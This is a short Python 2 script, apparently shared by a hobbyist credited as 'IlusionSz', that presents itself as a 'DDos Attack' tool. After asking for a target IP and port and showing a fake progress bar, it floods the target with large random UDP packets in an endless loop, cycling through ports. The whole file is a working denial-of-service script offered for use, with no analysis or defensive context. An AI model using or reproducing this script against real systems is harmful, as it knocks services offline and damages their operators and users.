import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(50000)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
print "Author   : IlusionSz"
print "You Tube : https://www.youtube.com/c/IlusionDev"
print "github   : https://github.com/cau-flare"
print "Discord : Ilusion#0779"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% Carregando"
time.sleep(5)
print "[=====               ] 25% Carregando"
time.sleep(5)
print "[==========          ] 50% Carregando"
time.sleep(5)
print "[===============     ] 75% Carregando"
time.sleep(5)
print "[====================] 100% Carregando"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Enviando %s packet para %s com a porta:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

